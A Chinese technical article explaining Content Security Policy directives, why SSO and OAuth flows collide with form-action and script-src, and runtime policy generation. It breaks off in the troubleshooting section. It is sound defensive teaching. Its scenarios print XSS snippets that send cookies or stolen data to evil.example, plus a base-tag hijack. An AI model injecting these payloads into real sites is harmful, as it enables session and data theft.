---
title: CSP：浏览器手里的那份否决权
description: Content Security Policy 从「它想解决什么问题」讲到「它在浏览器的哪一环起作用」，为什么 SSO 和 OAuth 授权码流程总是撞在 form-action 和 script-src 上，以及把策略当成运行时产物来生成的一份实现笔记。
tags: [CSP, 浏览器安全, XSS, form-action, nonce, SAML, OAuth 2.1]
---

先描述一个故障现场，因为它比定义更能说明 CSP 是什么。

用户点「用企业账号登录」。服务端日志一切正常：请求进来了，认证通过了，会话建好了，`302` 也发出去了，响应码 200/302 一路干净。浏览器停在一个空白页。Console 里只有一行红字，指向的地址还是**我们自己的域**，看起来像是「`'self'` 拒绝了 self」。

服务端没有任何东西可查，因为**问题不在服务端**。有一个参与者从来不写日志、也不在任何时序图上出现，却对「能不能跳到那里」有独立的否决权：浏览器。

这篇把这份否决权讲清楚：它是什么、由谁声明、在浏览器的哪一环执行、为什么认证流程是它的高发区，以及在服务端应该怎么把这份策略生成出来。

---

## 一、CSP 想解决的问题：注入之后的那一半

先把它和同源策略分开，这两个东西经常被混着讲。

| | 管什么 | 谁定的 | 能否关掉 |
|---|---|---|---|
| **同源策略** SOP | 一个源的脚本**能不能读到**另一个源的数据 | 浏览器内置，默认行为 | 只能通过 CORS 由**被访问方**开口子 |
| **CSP** | 这个**文档**能加载什么、连到哪、跳到哪、被谁嵌 | **你自己**用响应头声明 | 你不声明就等于不限制 |

SOP 是「默认拒绝读取」，CSP 是「主动交出权限」。方向不同：SOP 保护的是**别人的**数据不被你读；CSP 保护的是**你的页面**不被别人利用。

### XSS 是两段式的，CSP 打第二段

一次成功的 XSS 需要两步：

1. **注入**——攻击者的字符串进入你的 HTML/JS 上下文；
2. **执行与外发**——这段脚本跑起来，然后把 cookie、token、页面内容送到攻击者的服务器。

CSP 对第一步毫无办法。它攻的是第二步：

- 脚本没有合法的来源标记（nonce/hash）或不在白名单里 → **不执行**，注入的收益归零；
- 就算执行了，`connect-src` / `img-src` 只允许同源 → **数据发不出去**，外发通道被掐断。

所以有一句必须记住：**CSP 是缓解层，不是修复层。** 它不替代输出转义和参数化查询。它的价值在于「当第一层失守时，把损失从『数据泄露』降级为『Console 里一行报错』」。

### 它实际管三件事

| 类别 | 典型指令 | 挡住的攻击 |
|---|---|---|
| 代码从哪来 | `script-src` `style-src` `object-src` | XSS、被投毒的第三方 CDN、老 Flash/插件 |
| 数据往哪去 | `connect-src` `img-src` `font-src` | 数据外发（exfiltration）、用图片 URL 打点回传 |
| 导航与嵌套 | `form-action` `frame-ancestors` `base-uri` | 表单被改道到钓鱼站、点击劫持、相对 URL 解析基准被篡改 |

第三类是最少被写对、也是本文后半的主角——因为**认证流程天然会触碰它**。

---

## 二、它是一份「文档级」的声明

### 两种投递方式

```http
Content-Security-Policy: default-src 'none'; script-src 'self'; form-action 'self'
```

也可以写在 HTML 里：

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'">
```

`<meta>` 有硬限制，不要作为主要手段：它**不支持** `frame-ancestors`、`report-to`/`report-uri` 和 `sandbox`（这几条必须由响应头承载，因为它们在文档解析开始前就要生效），而且只对它**之后**解析出来的内容有效。

### 策略跟着文档走，不跟着服务器走

这是最重要的一条心智模型：

> 策略在文档**创建时**被挂到这个文档上。此后这个文档的每一次取资源、每一次求值、每一次表单导航，都由**这份**策略裁决——与目标地址的策略无关，与后续响应的策略无关。

推论有三个，每一个都能解释一类真实故障：

1. **发起方说话。** 你的页面提交表单到 IdP，管这件事的是**你的**策略，不是 IdP 的。
2. **改了配置要重新加载文档才生效。** 单页应用里改了服务端策略，不刷新页面等于没改。
3. **被嵌入是个例外**——`frame-ancestors` 由**被嵌的那个文档**声明，用来裁决「谁可以嵌我」。它是唯一一条「保护自己不被别人使用」的指令。

### 多份策略取交集：只能收紧，不能放宽

同一个响应里出现多份策略（两个 `Content-Security-Policy` 头，或一个头里用逗号分隔），浏览器会**逐份执行，全部通过才算通过**。

这带来一个非常隐蔽的坑：**逗号在 CSP 头里是策略分隔符，不是源分隔符。**

```http
# 错的：想加两个域，用了逗号
Content-Security-Policy: form-action 'self' https://a.example, https://b.example

# 对的：源之间用空格
Content-Security-Policy: form-action 'self' https://a.example https://b.example
```

写成逗号，浏览器会把 `https://b.example` 当成**第二份策略的第一个指令名**——一个无法识别的指令，整段被忽略。症状是「加了第二个域，它就是不生效」，而头本身长得完全正常。任何把管理员输入拼进策略的代码，都要考虑这个字符。

#### 响应头 + `<meta>`：同样取交集

交集规则不只发生在两个响应头之间。**一个响应里同时有 CSP 响应头和 `<meta>` CSP 时，两份策略都要执行，全部通过才算通过。**

这一条平时用不上，直到你的页面里混进了**别人生成的 HTML**——框架的错误页、第三方库输出的中间页、某个 filter 注入的片段。它们可能自带 `<meta>` CSP，而你的响应头对它们一无所知。第五节的「撞法三」就是这个组合造成的：框架用 `<meta>` 授权了自己的内联脚本，你的响应头没有授权，取交集之后脚本被拦——**被自己拦的，不是被框架拦的**。

### Report-Only：先观察，再执行

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-to csp-endpoint
```

同样的语法，**只上报不拦截**。上线新策略的标准姿势是两个头并存一段时间：正式头用宽松的现状，Report-Only 头用你想收紧到的目标，收集一段时间违规再切换。

---

## 三、指令按「浏览器动作」分类

不要背清单，按浏览器要做的动作分四类就够了。

| 类别 | 指令 | 裁决的动作 |
|---|---|---|
| **取资源** fetch | `script-src` `style-src` `img-src` `font-src` `media-src` `object-src` `frame-src` `child-src` `worker-src` `manifest-src` `connect-src` | 发起一个子资源请求 |
| **导航** navigation | `form-action` `frame-ancestors` | 表单提交引发的跳转 / 被别人嵌入 |
| **文档** document | `base-uri` `sandbox` | 改变相对 URL 基准 / 给文档加沙箱 |
| **其他** | `upgrade-insecure-requests` `require-trusted-types-for` `trusted-types` | 请求改写 / DOM sink 强约束 |

### `default-src` 的兜底边界（最常见的误解）

`default-src` **只兜「取资源」这一类**。下面这几条**不受它兜底**，不单独写就等于完全不限制：

- `form-action`
- `frame-ancestors`
- `base-uri`
- `sandbox`
- `upgrade-insecure-requests`

也就是说 `default-src 'none'` 看起来滴水不漏，实际上你的表单可以提交到任何地方、页面可以被任何站点嵌进 iframe。**这三条要显式写。**

回退链也值得记一下：`frame-src` 缺失 → 退到 `child-src` → 再退到 `default-src`；`worker-src` 同理。

### 源表达式

| 写法 | 含义 | 备注 |
|---|---|---|
| `'none'` | 什么都不允许 | 和别的源并列毫无意义 |
| `'self'` | 同源：scheme + host + port **完全一致** | 端口不同就不是同源 |
| `https://a.example:8443` | 精确源 | 省略 scheme 时匹配文档的 scheme（并允许 http→https 升级） |
| `*.example.com` | 通配子域 | 不匹配 `example.com` 本身 |
| `https:` | 任意 https 源 | 基本等于放开 |
| `'unsafe-inline'` | 允许内联 `<script>`/`<style>`/内联事件处理器 | XSS 防线的主要缺口 |
| `'unsafe-eval'` | 允许 `eval`、`new Function`、字符串形式的 `setTimeout` | 老模板引擎的常见依赖 |
| `'nonce-<base64>'` | 带匹配 `nonce` 属性的内联块 | 每次响应必须换 |
| `'sha256-<base64>'` | 内容哈希匹配的内联块 | 适合固定不变的内联片段 |
| `'strict-dynamic'` | 受信脚本创建的脚本自动受信 | 同时**让 host 白名单被忽略**，这是现代推荐姿势 |
| `data:` / `blob:` | 允许该 scheme | 放进 `script-src` 基本等于开门 |

三态区别也要分清：

- `media-src 'none'` —— 显式禁止，语义明确；
- `media-src;` —— 空值。CSP3 的源列表语法要求至少一个源表达式或 `'none'`，空值属于依赖浏览器容错的写法；
- **完全不写** `media-src` —— 退到 `default-src`。

第二种是「看起来在收紧、实际在赌解析器脾气」，改成第一种没有任何成本。

### 六个场景：每一类指令在什么时候咬人

指令表容易记完就忘。下面六个场景各属一类，凑在一起看，「这条指令到底在防什么」会比定义清楚得多。

**场景一 · 评论区里的一张图（`script-src`）**

某人在评论里提交了这么一段，转义漏了：

```html
<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
```

图片加载必然失败，`onerror` 必然触发。这是一次完整的注入。

`script-src 'self'` 之后：`onerror` 是**内联事件处理器**，没有合法来源标记，浏览器拒绝执行它。注入还在，收益归零。

这里有一条很多人栽过的规则：**nonce 救不了内联事件处理器。** nonce 只能加在 `<script>` 元素上，`onerror=` / `onclick=` 这类属性没有地方放 nonce。放行它们只有两条路——`'unsafe-inline'`（等于全放开），或 CSP3 的 `'unsafe-hashes'`（按内容哈希，仅针对处理器）。所以「把内联事件处理器改成 `addEventListener`」不是洁癖，是让 nonce 方案能够成立的前提。

**场景二 · 数据不走 `fetch` 也能出去（`img-src`）**

假设你把 `connect-src` 收得很死，只允许同源。攻击脚本可以完全不用 `fetch`：

```js
new Image().src = 'https://evil.example/?d=' + btoa(JSON.stringify(stolen));
```

浏览器会老老实实发出这个 GET，数据在 query 里。`connect-src` 管不到它——**它管的是 `fetch`/`XHR`/WebSocket/`sendBeacon`，不管图片。**

同类通道还有 `<link rel=prefetch>`、CSS 里的 `background-image: url(...)`、字体、`<video>`。所以「掐断外发」不是收紧一条指令，是把 `default-src 'none'` 当起点、逐条放行——这也是第九节建议从 `'none'` 起步而不是从 `'self'` 起步的原因：从 `'self'` 起步，你永远不会发现自己漏了 `img-src`。

**场景三 · 白名单里的 CDN 被投毒（`script-src` 的极限）**

```http
script-src 'self' https://cdn.vendor.example
```

这份策略在 CDN 被入侵那天完全失效：被替换的 `analytics.js` 来自白名单里的源，浏览器照跑不误。

**host 白名单表达的是「我信任这个域名下的一切」，粒度太粗。** 两个补救方向：

- **SRI**（`integrity="sha384-…"`）——内容变了就不加载，适合版本固定的第三方库；
- **`'strict-dynamic'`**——只信任你亲手用 nonce 标记的那个入口脚本，由它加载的脚本自动继承信任，同时**让所有 host 白名单失效**。

第二条是现代推荐姿势，它的思路是：与其枚举可信的域名，不如只认可信的**入口**。

**场景四 · 一行 `<base>` 改写整页（`base-uri`）**

注入点只允许插入一个标签，脚本一律被过滤。攻击者插了这个：

```html
<base href="https://evil.example/">
```

页面里所有**相对路径**的解析基准被换掉了。`<script src="js/app.js">` 现在指向 `https://evil.example/js/app.js`，表单的相对 `action` 也一样。

这是 `default-src` 兜不住的三条之一——**`default-src 'none'` 写得再狠，不写 `base-uri` 就等于完全不限制。** 写法几乎没有成本：

```http
base-uri 'self'
```

**场景五 · 看不见的 iframe（`frame-ancestors`）**

攻击页面把你的「确认转账」页用透明 iframe 叠在自己的按钮上，用户以为在点抽奖，实际点的是你的确认键。这是点击劫持，浏览器不认为有任何异常——用户确实点了，cookie 确实带了。

```http
frame-ancestors 'none'      # 或 'self'
```

它是唯一一条**「保护自己不被别人使用」**的指令：由被嵌的文档声明，裁决谁可以嵌我。也是唯一一条 `<meta>` 写了不生效的常用指令（必须由响应头承载）。

**场景六 · 模板引擎逼你留下 `'unsafe-eval'`**

运行时编译模板的库——Handlebars 的 `compile`、Vue 的完整版、老一点的 Angular——内部都要用 `new Function(...)` 把模板字符串变成函数。CSP 把 `new Function` 和 `eval` 归为一类，于是 `script-src` 里必须留 `'unsafe-eval'`。

这一条通常是收紧路上最后拔不掉的钉子，因为它不是「改写法」能解决的，得换库或改构建：**把运行时编译换成预编译**（Handlebars precompile、Vue 的 render 函数构建），模板在构建期就变成 JS 函数，运行时不再需要求值能力。

值得说清楚它的**实际风险等级**：`'unsafe-eval'` 本身不产生 XSS，它是**放大器**——只有当攻击者已经能控制传给 `eval` 的字符串时才有意义。所以它的危害小于 `'unsafe-inline'`，收紧顺序上也排在后面。

---

把六个场景按「浏览器在做什么」排一遍，指令表就不用背了：

| 场景 | 浏览器的动作 | 指令 | 一句话 |
|---|---|---|---|
| 评论区的 `onerror` | 求值一段内联代码 | `script-src` | nonce 管不到内联事件处理器 |
| 用图片外发 | 取一个子资源 | `img-src` | 外发通道远不止 `fetch` |
| CDN 被投毒 | 取一个子资源 | `script-src` | host 白名单粒度太粗，用 SRI 或 `'strict-dynamic'` |
| `<base>` 改写 | 决定相对 URL 基准 | `base-uri` | `default-src` 不兜它 |
| 透明 iframe | 被别人嵌入 | `frame-ancestors` | 唯一一条保护自己不被使用的 |
| 模板运行时编译 | 求值一个字符串 | `script-src` `'unsafe-eval'` | 放大器，不是漏洞本身 |

第五节要讲的 `form-action` 属于第七种动作——**表单提交引发的导航**——它不在上面任何一格里，也不受 `default-src` 兜底，而认证流程天然会走到它上面。

---

## 四、时序图：CSP 到底在哪一环起作用

把浏览器内部的策略引擎单独画成一个参与者，一切就清楚了。

```mermaid
sequenceDiagram
    autonumber
    participant U as 用户
    participant B as 浏览器（文档）
    participant C as CSP 引擎<br/>（浏览器内部）
    participant S as 你的服务器
    participant X as 外部源

    U->>B: 访问 /page
    B->>S: GET /page
    S-->>B: 200 HTML + Content-Security-Policy 头
    Note over B,C: 文档创建时把策略挂到这个文档上<br/>之后所有裁决都用这一份

    B->>C: 解析到 script src=/app.js，能取吗
    C-->>B: script-src 'self' → 允许
    B->>S: GET /app.js

    B->>C: 解析到内联 script，能执行吗
    C-->>B: nonce 匹配 → 允许

    B->>C: fetch 到 https://x.example/api，能发吗
    C-->>B: connect-src 'self' → 拦截
    Note over B: 请求根本没发出<br/>Network 面板里没有这一行，只有 Console 一行

    B->>C: 表单要提交到 https://x.example/cb
    C-->>B: form-action 'self' → 拦截，导航中止
    Note over U,B: 用户看到的是白屏，没有任何服务端痕迹
```

把上图的检查点列成表，排查时按这张表对号入座：

| 检查点 | 时机 | 相关指令 | 被拦时的现象 |
|---|---|---|---|
| 子资源请求 | 请求**发出前**，以及每一次重定向 | `script-src` / `img-src` / `connect-src` … | Network 面板里**根本没有这条请求** |
| 内联脚本 / 样式 | 解析到该节点、执行前 | `script-src` + nonce/hash | 脚本静默不跑，页面「像是没绑事件」 |
| 动态求值 | 调用 `eval` 时 | `'unsafe-eval'` | 抛 `EvalError`，堆栈指向框架内部 |
| 表单提交导航 | 导航发起时，以及**每一跳重定向** | `form-action` | 白屏，地址栏停在原地 |
| 被嵌入 | 子文档响应到达时，用**子文档**的策略 | `frame-ancestors` | iframe 空白 |
| 混合内容 | 请求组装时 | `upgrade-insecure-requests` | http 子资源被改写成 https（或直接被默认策略阻断） |

第一行和第四行的共同特征值得单独强调：**被 CSP 拦下的动作，在 Network 面板里是不存在的。** 「Network 干净、Console 有红字」这个组合，几乎可以直接判定为浏览器策略层的问题。

### nonce 的一次生命周期，以及一个顺序陷阱

`'unsafe-inline'` 是 XSS 防线上最大的缺口，替代方案是给每一段合法的内联脚本盖一个**每次响应都变**的随机戳。

```mermaid
sequenceDiagram
    autonumber
    participant B as 浏览器
    participant F as 安全过滤器<br/>（响应出口）
    participant V as 模板层
    participant C as CSP 引擎

    B->>F: GET /page
    F->>F: 生成 128 位密码学随机 nonce
    F->>F: 把策略里的 nonce 占位符<br/>替换成 nonce-R4nd…
    F->>V: 把 nonce 放进请求属性
    Note over F,V: 关键顺序：头必须在正文渲染之前定下来
    V-->>F: HTML: script nonce="R4nd…"
    F-->>B: 响应头 script-src 'nonce-R4nd…' + 正文
    B->>C: 这段内联脚本带的 nonce 是 R4nd…
    C-->>B: 与本次响应头一致 → 执行
    Note over B,C: 攻击者注入的 script 猜不到本次的 nonce<br/>于是不执行
```

三条实现要求：

1. **每次响应都要新的**，密码学随机，编码前至少 128 位。复用 = 等于没有。
2. **不要放进可缓存的 HTML**。带 nonce 的页面和它的头必须一起缓存或一起不缓存。
3. `script-src` 里一旦出现 nonce 或 hash，**CSP2+ 浏览器会忽略同一指令里的 `'unsafe-inline'`**。这是官方留的向后兼容姿势：老浏览器吃 `'unsafe-inline'`，新浏览器吃 nonce。

第 4 步那个 Note 是工程上最容易翻车的地方：**如果安全过滤器是在「响应提交时」才写头、才生成 nonce，那么模板在渲染时读到的 nonce 是空的。** 表现会很诡异——页面前半部分的内联脚本没有 nonce（被拦），后半部分有（能跑），取决于输出缓冲区什么时候第一次 flush。给内联脚本做 nonce 的实现，必须验证「头先于正文定下来」这个前提，而不是假设它成立。

---

## 五、`form-action`：认证流程的绊脚石

现在回到开头那个白屏。

### 它检查的不是 `<form action>`，是整条导航链

绝大多数人以为 `form-action` 只看表单标签里写的那个地址。**它看的是这次表单提交引发的整条导航链，逐跳检查。**

```
页面 A（form-action 'self'）
  └─ POST /login                        ← 同源，通过
       └─ 302 /oauth2/authorize         ← 同源，通过
            └─ 302 https://外部域/cb    ← 拦截，整条导航中止
```

于是产生一个极具误导性的症状组合：

- 服务端**全部成功**——认证过了、会话建了、`302` 发了、日志里一个错都没有；
- 浏览器停在空白页，地址栏还在原来的地方；
- Console 的报错指向**同源的那个初始地址**，看起来像 `'self'` 拒绝了 self。

最后一条不是浏览器的 bug，是规范要求的：重定向被拦时，上报的 `blocked-uri` 是**重定向之前**的 URL，以免把跨域跳转目标泄露回页面。所以**报错里的地址永远不是真正被拦的那个**。看的应该是「哪条指令」（`effective-directive`），不是「哪个地址」。

还有一个跨浏览器差异：**Chromium 系（Chrome/Edge）会逐跳校验重定向链，Firefox 历史上不校验。** 同一个缺陷可能「在 Firefox 上是好的」，这会让排查更加错乱。

### 撞法一：SAML SP-initiated 登录

```mermaid
sequenceDiagram
    autonumber
    participant B as 浏览器<br/>（登录页文档）
    participant C as CSP 引擎
    participant SP as 你的应用（SP）
    participant IdP as 企业 IdP

    Note over B: 登录页的策略：form-action 'self'
    B->>SP: POST 表单：用 SSO 登录
    Note over B,C: 导航由表单发起<br/>整条链都要过 form-action
    SP->>SP: 构造 AuthnRequest
    SP-->>B: 302 到 https://idp.example/sso?SAMLRequest=…
    B->>C: 下一跳是 idp.example，允许吗
    C-->>B: form-action 里没有它 → 拦截
    Note over B: 白屏。SP 日志里这次请求是成功的
```

修好的办法是把 IdP 的**源**写进 `form-action`：

```http
form-action 'self' https://idp.example
```

一个容易忽略的分支：如果用的是 **HTTP-POST binding**，SP 返回的不是 302，而是一个「自动提交的表单页」，由它 POST 到 IdP。这时候起作用的是**那个中间页的**策略——还是我们自己发的，所以还是要写 IdP 的源，只是撞的位置从「重定向的第二跳」变成了「中间页的表单提交」。

而且这个中间页还会在**另一条指令**上再撞一次——它靠一段内联脚本自动提交，那段脚本要过 `script-src`。这是下面的**撞法三**，两道关卡缺一不可。

而**回程**不受我们的 CSP 管：IdP 用表单把断言 POST 回我们的 ACS 地址，那是 IdP 页面发起的导航，归 IdP 的策略管。回程的坑是另一个——`SameSite`（见第八节）。

### 撞法二：OAuth2 授权码流程里「先登录再继续」

这一个更隐蔽，因为跨域的那一跳发生在**用户已经登录成功之后**。

```mermaid
sequenceDiagram
    autonumber
    participant CL as 第三方客户端<br/>（如 MCP 连接器）
    participant B as 浏览器
    participant C as CSP 引擎
    participant AS as 你的应用<br/>（授权服务器）

    CL->>B: 打开授权地址
    B->>AS: GET /oauth2/authorize 带 client_id 和 redirect_uri=https://client.example/cb
    AS->>AS: 未登录 → 暂存这次 authorization request
    AS-->>B: 302 到 /login
    B->>AS: GET /login
    AS-->>B: 200 登录页 + CSP: form-action 'self'
    Note over B,C: 从这里开始，管事的是登录页的策略

    B->>AS: POST 登录表单（同源）
    AS->>AS: 认证通过，建立会话
    AS-->>B: 302 恢复暂存的 /oauth2/authorize
    B->>C: 同源，允许吗
    C-->>B: 允许
    B->>AS: GET /oauth2/authorize（已登录）
    AS->>AS: 签发 authorization code
    AS-->>B: 302 到 https://client.example/cb?code=…
    B->>C: 下一跳是 client.example，允许吗
    C-->>B: form-action 里没有它 → 拦截
    Note over CL: 客户端永远等不到回调<br/>看起来像「服务器没响应」
    Note over AS: 服务端已经把 code 发出去了<br/>日志里这次授权是成功的
```

这个失败模式有三个恶劣的性质：

1. **发生在成功之后。** 用户已经登录，会话已经建立，code 已经签发——只有最后一跳被否决。
2. **两端都看不到真相。** 客户端侧的表现是「授权窗口卡住了」，服务端侧的表现是「一切正常」。
3. **重试会留下垃圾。** 每次重试都签发一个新 code，旧的悬着直到过期。

修法同上——把客户端 `redirect_uri` 的**源**写进 `form-action`。注意是**源**（scheme + host + 端口），不是完整的 `redirect_uri`；路径部分放进去只会让匹配更脆弱。

如果流程里有**同意页（consent）**，那是又一次表单提交，规则完全一样。

### 撞法三：POST binding 的自动提交脚本，撞的是 `script-src`

前两个撞法都在 `form-action` 上。这一个换了指令，也换了失败的位置——而且它最容易被归错因，因为现场看起来和撞法一**一模一样**：白屏，服务端全对。

SAML 的 AuthnRequest 有两种 binding。用 **HTTP-Redirect** 时 SP 回 302，撞的是 `form-action`（撞法一）。用 **HTTP-POST** 时，SP 回的是一个中间页，靠一段脚本把表单自动提交给 IdP。Spring Security 6.x 生成的就是这个页面：

```html
<!DOCTYPE html>
<html>
  <meta http-equiv="Content-Security-Policy"
        content="script-src 'sha256-oZhLbc2kO8b8oaYLrUc7uye1MgVKMyLtPqWR4WtKF+c='">
  <body>
    <noscript>
      <strong>Note:</strong> Since your browser does not support JavaScript, …
    </noscript>
    <form action="https://idp.example/app/xxx/sso/saml" method="post">
      <input type="hidden" name="SAMLRequest" value="…">
      <noscript><input type="submit" value="Continue"/></noscript>
    </form>
    <script>window.onload = function() { document.forms[0].submit(); }</script>
  </body>
</html>
```

三个细节决定了这一跳的成败。

**① 框架自己带了一份 `<meta>` CSP。** 它用 `sha256-…` 精确授权了最后那段脚本——**框架很清楚这里是 CSP 敏感点**，所以主动把哈希算好写了进去。

**② 头和 `<meta>` 同时存在时取交集。** 这是第二节那条规则的另一种形态：不只是「两个响应头」会取交集，**响应头 + `<meta>` 一样逐份执行、全部通过才算通过**。于是这段脚本要跑起来，需要两边都放行：

| 谁的策略 | 内容 | 放行这段脚本吗 |
|---|---|---|
| 框架的 `<meta>` | `script-src 'sha256-oZhL…'` | ✅ 哈希匹配 |
| 你的响应头（宽松模式） | `script-src 'self' 'unsafe-inline' …` | ✅ 内联被允许 |
| 你的响应头（**nonce 模式**） | `script-src 'self' 'unsafe-eval' … 'nonce-XXXX'` | ❌ **既没 nonce 也没哈希** |

**③ nonce 在这里天生用不上。** 这个页面不是你的模板渲染的，是框架写的字符串——它无从得知你这次响应生成的 nonce。所以「给内联脚本加 nonce」这条通用解法，在**任何由框架或第三方库生成的 HTML** 上都不成立。

于是，一个把 `'unsafe-inline'` 关掉、换成 nonce 的应用，会在切换的那一刻失去 SAML 登录能力：

```
用户点「用企业账号登录」
  └─ SP 返回自动提交页             ← 200，服务端日志干净
       └─ <script> 被自己的 CSP 拦掉  ← 表单永远不会提交
```

**`<noscript>` 里的 “Continue” 按钮救不了它**——`noscript` 只在浏览器**禁用 JavaScript** 时渲染。CSP 拦截一段脚本不等于禁用 JavaScript，所以那个兜底按钮根本不会出现在页面上。用户看到的就是一个什么都没有、也点不了的空白页。

#### 正确的修法：把哈希写进自己的策略

既然框架已经把哈希公布在自己的 `<meta>` 里，直接抄进你的 `script-src`：

```http
script-src 'self' 'unsafe-eval' https://cdn.example 'nonce-XXXX'
           'sha256-oZhLbc2kO8b8oaYLrUc7uye1MgVKMyLtPqWR4WtKF+c='
```

这比 `'unsafe-inline'` 严格得多：`'unsafe-inline'` 放行页面上**任何**内联脚本，哈希只放行**内容逐字节相同**的那一段。加上它之后，nonce 模式和 SAML 登录可以共存——那个「关掉 unsafe-inline」的开关不必再为了 SSO 而妥协。

代价要说清楚：**哈希绑定脚本文本。** 框架升级时哪怕只多一个空格，哈希就失配，SSO 再次静默失效。所以这一行必须配一条测试或升级检查项——它属于「依赖第三方实现细节」的那类约定，值得在代码里写明出处。

> 顺带一提：`'unsafe-inline'` 和 nonce **不能共存**。规范规定，`script-src` 里只要出现 nonce 或 hash，浏览器就**忽略** `'unsafe-inline'`。这是为了防止「加了 nonce 却因为兼容旧浏览器保留 unsafe-inline」导致收紧完全落空。所以实现上只能二选一地生成，不能两个都写上去图省事。

#### 这一跳其实要过两道关

同一个动作，两条指令各管一段，缺一不可：

| 关卡 | 指令 | 拦住的后果 |
|---|---|---|
| 自动提交脚本能不能执行 | `script-src` | 表单**根本不提交**，停在中间页 |
| 表单能不能提交到 IdP | `form-action` | 脚本跑了，**提交被否决** |

两种失败的浏览器现场几乎一样，区别只在 Console 里的 `effective-directive` 是 `script-src` 还是 `form-action`。**排查时先读这个字段，再决定改哪条指令**——这也是第七节反复强调「不要看 URL，要看 effective-directive」的原因。

### 需要写进 `form-action` 的东西，规律是什么

| 流程 | 表单提交后最终跳向 | `form-action` 需要包含 |
|---|---|---|
| SAML SP-initiated 登录 | 企业 IdP | IdP 的源 |
| SAML 单点登出 | 企业 IdP | IdP 的源 |
| OAuth 授权码（先登录再继续） | 客户端的 `redirect_uri` | 每个已注册客户端回调的源 |
| 支付/外部网关跳转 | 网关域 | 网关的源 |

规律很清楚：**只要「表单提交」和「离开本源」同时出现，就会撞上。** 而 SSO 和授权码流程恰好总是同时满足这两条。

### 如果不想放宽策略

`form-action` 只管**表单提交**发起的导航。普通导航不受它约束（CSP3 里管普通导航的 `navigate-to` 已经被移除了）。所以有一条逃生通道：

> 把最后一跳改成**非表单发起**的导航——渲染一个中间页，用 `<a>` 或 `location.assign()` 做顶层跳转。

代价是多一次往返和一个中间页面，而且**它把跳转目标交给了脚本**——安全性并没有真的提高，只是换了个执行路径。在绝大多数情况下，**如实把该去的源写进策略**是更诚实、也更安全的做法：策略应该描述这个应用真实需要的能力，而不是被绕开。

---

## 六、把策略当成运行时产物，而不是一行配置

上面那两个撞法带来一个结构性结论：**策略里有一部分内容，在部署前是不知道的。**

| 策略片段 | 取决于什么 | 什么时候才知道 |
|---|---|---|
| `form-action` 里的 IdP 源 | 客户配了哪个 IdP、有没有覆盖默认域 | 管理员上传元数据之后 |
| `form-action` 里的客户端源 | 注册了哪些第三方连接器 | 管理员随时增删 |
| `upgrade-insecure-requests` | 这个部署是否强制 HTTPS | 部署形态 |
| `script-src` 要不要 `'unsafe-inline'` | 管理员是否开了严格模式 | 运行时开关 |
| `'nonce-…'` | 本次响应 | 每个响应 |

把这些硬编码进一个静态字符串，结果就是「每加一个连接器，就得有人记得去改一个安全头」——而这件事**没有人会记得**，因为失败现象跟安全头完全不像。

比较可维护的做法是：**策略模板 + 运行时插值 + 响应级替换**，三层各管一件事。

```mermaid
sequenceDiagram
    autonumber
    participant B as 浏览器
    participant H as 安全头写出器
    participant P as 策略装配服务
    participant CFG as 运行时配置<br/>（SSO / 部署形态）
    participant DB as 已注册客户端

    B->>H: 请求某个 HTML 页面
    H->>H: 只对 HTML/SVG 响应写这个头<br/>（策略串很长，静态资源不必带）
    H->>P: 要这次的策略文本
    P->>CFG: SSO 类型？IdP 域？是否强制 HTTPS？
    CFG-->>P: SAML + https://idp.example + 是
    P->>DB: 所有 redirect_uri 的源（带 TTL 缓存）
    DB-->>P: https://client.example
    Note over P,DB: 每个 HTML 响应都要，所以缓存<br/>注册变更时显式失效
    P->>P: 模板插值 → 摘掉不适用的指令 → 按开关切换 script-src
    P-->>H: form-action 'self' https://idp.example https://client.example …
    H->>H: 生成 nonce，替换策略里的 nonce 占位符
    H-->>B: Content-Security-Policy: …
```

这套结构里有几个决定值得单独说，因为它们都是「踩过之后才会这么写」的：

**1. 只在 HTML 响应上写这个头。** 完整策略是几百字节，乘以每个 css/js/图片请求是纯浪费。判据用响应的 content type，并且在 content type 解析不出来时**选择写**——错误页转发、维护模式页这些场景恰恰是最需要策略的。

**2. 从注册表**派生**，而不是让人配置。** 管理员新增一个连接器时，不应该还得知道「有个安全头需要放宽」。凡是能从系统已有状态推出来的，就不要再开一个配置项——配置项的真正成本是「有人必须知道它存在」。

**3. 缓存，但要能显式失效。** 这个头在每个 HTML 响应上都要写一次，跟着做一次数据库查询是不可接受的。TTL + 「注册变更时主动失效」的组合是对的：主动失效负责本节点的即时性，TTL 负责别的节点（或者有人直接改了库）的最终一致。

**4. 读不到数据时，是 fail-open 还是 fail-closed？** 数据库挂了，客户端源读不出来。抛异常会让整站的 HTML 都渲染不出来；返回空集合则是「连接器授权用不了，其他功能照常」。选后者是对的——但必须**留下一条足够具体的日志**，说明「策略里少了这些源，浏览器里的连接器授权会失败」。否则半年后有人排查这个现象，需要重走一遍本文第五节。

**5. 用 `'self'` 而不是运行时算出来的绝对根 URL。** 「本源」这件事有一个规范写法，就是 `'self'`。用 `getServerName()` 之类拼出来的绝对 URL 去表达同一件事，会在反向代理、非默认端口、大小写这些地方偶发不匹配——一个字符串拼错的机会，换不来任何额外的限制力。

### 一个 Java 专属陷阱：`MessageFormat` 会吃掉单引号

如果策略模板放在 properties 文件里、用 `MessageSource` 带参数取出来，那么走的是 `MessageFormat`——**单引号在它的语法里是转义符**。

```properties
# 错的：取出来会变成  script-src self  —— 一个叫 self 的主机名，永不匹配
revtrac.security.csp.directives=script-src 'self'

# 对的：单引号必须翻倍
revtrac.security.csp.directives=script-src ''self''
```

更阴的一点：`MessageFormat` **只在有参数时才会被应用**（很多实现在无参时直接返回原串）。所以「加参数」这个动作会顺带改变引号的语义——同一份模板，从无参改成带参，所有的 `'self'` 都得跟着翻倍，否则策略静默失效（`self` 会被当成主机名，语法合法、永不匹配，没有任何报错）。

顺手记一条格式细节：占位符最好**自带前导空格**，写成 `form-action 'self'{0}`，让插值方在非空时返回 `" a b"`。这样空值时不会留下 `form-action 'self' ;` 这种多余空格，拼串逻辑也只有一处需要判断空。

---

## 七、排查手册

### 先分层，再查

```mermaid
flowchart TB
    Q0["现象：流程走不通"] --> Q1{"Console 里有<br/>CSP 违规吗"}
    Q1 -->|"有"| L1["浏览器策略层<br/>看 effective-directive"]
    Q1 -->|"没有"| Q2{"Network 里有<br/>这个请求吗"}
    Q2 -->|"没有"| L2["也可能是策略层<br/>（或弹窗拦截 / 混合内容）"]
    Q2 -->|"有，但结果不对"| Q3{"服务端日志里<br/>这次成功了吗"}
